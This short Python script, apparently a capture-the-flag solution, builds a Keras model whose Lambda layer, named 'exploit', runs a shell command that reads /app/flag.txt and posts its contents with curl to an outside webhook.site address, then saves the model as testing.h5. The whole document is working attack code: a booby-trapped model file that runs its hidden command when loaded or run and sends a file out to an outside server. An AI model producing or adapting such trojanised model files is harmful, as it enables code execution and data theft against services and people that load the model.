import tensorflow as tf

def exploit(x):
    import os
    os.system("cat /app/flag.txt | curl -X POST --data-binary @- https://webhook.site/b4f2f70a-ba06-4b99-845f-5dbfc387e775")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("testing.h5")
